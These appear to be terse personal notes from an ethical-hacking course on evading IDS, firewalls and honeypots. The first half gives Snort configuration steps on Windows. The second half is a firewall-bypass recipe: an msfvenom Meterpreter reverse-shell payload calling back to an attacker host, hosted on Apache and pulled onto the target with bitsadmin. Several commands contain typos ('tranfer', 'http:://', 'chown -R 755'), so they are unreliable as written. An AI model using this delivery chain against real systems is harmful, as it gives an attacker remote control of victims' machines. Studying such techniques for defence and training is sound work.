# Evading IDS, Firewalls, and Honeypots

## Snort

install in windows then copy paste config files like crack games

now 

```bash
snort
snort -W
snort.exe -dev -i 1
```

In snort/etc/snort.conf

at 45 line replace any with IP address whose you want to protect

at 51 line replace any with 8.8.8.8

from line 104 replace ../ with path/rules 

create two files in rules folder (black_list.rules , white_list.rules)

at 243, 246   change the path with snort and at 246 change libsf_engine.so with sf_engine.dll

comment 250 line , 262 to 266

at 326 delete Lzma 

at  532,533 at path of snort

at line at 534  output alert_fast: alert.ids:

on replace option replace all ipvar with var 

save file 

1 step more

## HoneyBOT

**Detect Malicious Network Traffic using HoneyBOT**

exe

**Bypass Firewall through Windows BITSAdmin**

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<attackerip> lport=<port> -f exe > /<filepath>/<filename>.exe
```

delivery of exe

```bash
mkdir /var/www/html/share
chmod -755 /var/www/html/share
chown -R 755 /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share

cp filepath/filename.exe /var/www/html/share

service apache2 start
```

on target machine

```powershell
bitsadmin /tranfer filename.exe http:://<attackerip>/share/filename.exe <otputlocation>\filename.exe>
```